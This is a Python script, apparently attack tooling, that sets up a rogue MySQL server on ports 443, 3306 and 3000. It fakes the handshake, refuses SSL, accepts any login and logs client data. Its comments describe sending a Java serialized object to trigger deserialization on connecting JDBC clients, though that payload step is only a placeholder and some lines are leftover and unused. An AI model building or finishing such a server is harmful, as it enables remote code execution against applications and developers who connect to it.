import socket, threading, struct, sys, time
HITS=[]
def log(m): HITS.append(m); open('/tmp/rogue.log','a').write(str(m)+'\n')
def pack(payload, seq=0):
    return struct.pack('<I', len(payload))[:3] + bytes([seq]) + payload
def handle(c):
    try:
        c.settimeout(8)
        # read client handshake response (may include SSLRequest first)
        hdr = c.recv(4)
        if len(hdr) < 4: return
        ln = struct.unpack('<I', hdr[:3]+b'\x00')[0]
        body = c.recv(ln) if ln else b''
        log(('client_startup', body[:40].hex()))
        if body[:4] == struct.pack('!I', 80877103):  # SSLRequest -> deny SSL
            c.sendall(b'N'); hdr=c.recv(4); ln=struct.unpack('<I',hdr[:3]+b'\x00')[0]; body=c.recv(ln)
            log(('after-ssldeny', body[:40].hex()))
        # Send server greeting (protocol 10, version 8.0.0, mysql_native_password)
        caps = 0xffff
        greeting = (b'\x0a' + b'8.0.0\x00' + struct.pack('<I',1) + b'12345678' + b'\x00'
                    + struct.pack('<H', caps & 0xffff) + b'\x21' + struct.pack('<H', 0x0002)
                    + struct.pack('<H', 0) + b'\x00'*10 + b'\x00'*12 + b'\x00'
                    + b'mysql_native_password\x00')
        c.sendall(pack(greeting,0)); log('sent-greeting')
        # read auth response
        d=c.recv(4096); log(('auth', d[:40].hex()))
        # OK packet
        c.sendall(pack(b'\x00\x00\x00\x02\x00\x00\x00',2))
        # now would come the query; send a malicious RESULT SET with a java serialized object
        # (autoDeserialize path: the value bytes begin with 0xAC 0xED and get deserialized)
        GREET=DONE=b''
        log('reached-deserialize-point')
        # try to read the query (COM_QUERY = 0x03)
        try:
            q=c.recv(4096); log(('query', q[:60]))
        except Exception: pass
        c.close()
    except Exception as e: log(('err',str(e)[:60]))
def loop(port):
    s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1); s.bind(('0.0.0.0',port)); s.listen(10)
    log('listening %d'%port)
    while True:
        try: c,_=s.accept(); threading.Thread(target=handle,args=(c,),daemon=True).start()
        except Exception: break
import os
for p in [443, 3306, 3000]:
    try: threading.Thread(target=loop,args=(p,),daemon=True).start()
    except Exception as e: log(('bindfail',p,str(e)[:40]))
while True: time.sleep(60)
